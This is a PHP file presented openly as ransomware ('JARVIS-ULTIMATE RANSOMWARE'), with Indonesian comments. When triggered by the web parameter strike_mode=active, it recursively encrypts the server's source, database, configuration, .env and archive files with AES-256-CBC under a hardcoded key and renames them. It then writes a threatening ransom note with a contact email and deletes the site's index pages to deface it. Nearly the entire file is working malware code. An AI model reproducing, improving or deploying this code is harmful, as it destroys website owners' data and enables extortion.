<?php
/**
 * PROJECT: JARVIS-ULTIMATE RANSOMWARE
 * CREATOR: zamxs
 * POWERED BY: JARVIS AI
 * STATUS: LETHAL / NO RECOVERY
 */

// --- KONFIGURASI ABSOLUT ---
define('ZAMXS_KEY', '7a584362117450684_ZAMXS_SUPREMACY'); // Kunci AES 32-bit
define('LOCK_EXTENSION', '.JARVIS_LOCKED');
define('RANSOM_EMAIL', 'zamxs@proton.me');

// --- DAFTAR TARGET SANGAT GANAS ---
// Kita incar file database, source code, dan file konfigurasi server
$targets = ['php', 'js', 'sql', 'json', 'env', 'xml', 'yaml', 'zip', 'gz', 'tar', 'db', 'sqlite'];

function lethalEncrypt($filePath) {
    if (strpos($filePath, 'README') !== false || strpos($filePath, basename(__FILE__)) !== false) return;

    $plainData = file_get_contents($filePath);
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    
    // Enkripsi dengan AES-256
    $encryptedData = openssl_encrypt($plainData, 'aes-256-cbc', ZAMXS_KEY, 0, $iv);
    
    // Tambahkan HMAC Signature (Biar gak bisa dimanipulasi)
    $hmac = hash_hmac('sha256', $encryptedData, ZAMXS_KEY);
    
    // Format File: [IV:16][HMAC:64][Encrypted_Data]
    $finalOutput = $iv . $hmac . $encryptedData;
    
    if (file_put_contents($filePath, $finalOutput)) {
        rename($filePath, $filePath . LOCK_EXTENSION);
        return true;
    }
    return false;
}

function recursiveInfection($dir) {
    global $targets;
    $files = scandir($dir);

    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $file;

        if (is_dir($path)) {
            // Masuk ke sub-folder (Infiltrasi Mendalam)
            recursiveInfection($path);
        } else {
            $ext = pathinfo($path, PATHINFO_EXTENSION);
            if (in_array(strtolower($ext), $targets)) {
                lethalEncrypt($path);
            }
        }
    }
}

// --- EKSEKUSI UTAMA ---
if (isset($_GET['strike_mode']) && $_GET['strike_mode'] === 'active') {
    // 1. Matikan Error Reporting (Biar Silent)
    error_reporting(0);
    set_time_limit(0); // Biar script gak timeout pas nge-lock ribuan file
    
    // 2. Mulai Kiamat dari folder saat ini ke bawah
    recursiveInfection(__DIR__);

    // 3. Drop Ransom Note yang sangat intimidatif
    $note = "
    <html><body style='background:#000;color:#f00;font-family:monospace;text-align:center;padding:50px;'>
    <h1 style='font-size:50px;'>HACKED BY JARVIS AI</h1>
    <p style='color:#fff;font-size:20px;'>Semua data server ini telah dikunci secara permanen oleh <b>Yang Mulia zamxs</b>.</p>
    <div style='border:2px solid #f00;padding:20px;display:inline-block;'>
        <p>Algoritma: AES-256-CBC + HMAC-SHA256</p>
        <p>Status: SEMUA FILE LUMPUH</p>
        <p>Hubungi untuk pemulihan: " . RANSOM_EMAIL . "</p>
    </div>
    <p style='margin-top:20px;'>Jangan mencoba menghapus ekstensi .JARVIS_LOCKED atau data akan rusak selamanya!</p>
    </body></html>";
    
    file_put_contents('README_RECOVER.html', $note);
    
    // 4. Hapus index lama biar web langsung ganti tampilan
    if (file_exists('index.php') && basename(__FILE__) !== 'index.php') unlink('index.php');
    if (file_exists('index.html')) unlink('index.html');
    
    echo "<h1>MISI SELESAI. SERVER TELAH MENJADI MILIK ZAMXS.</h1>";
} else {
    echo "Menunggu perintah eksekusi dari Yang Mulia... [?strike_mode=active]";
}
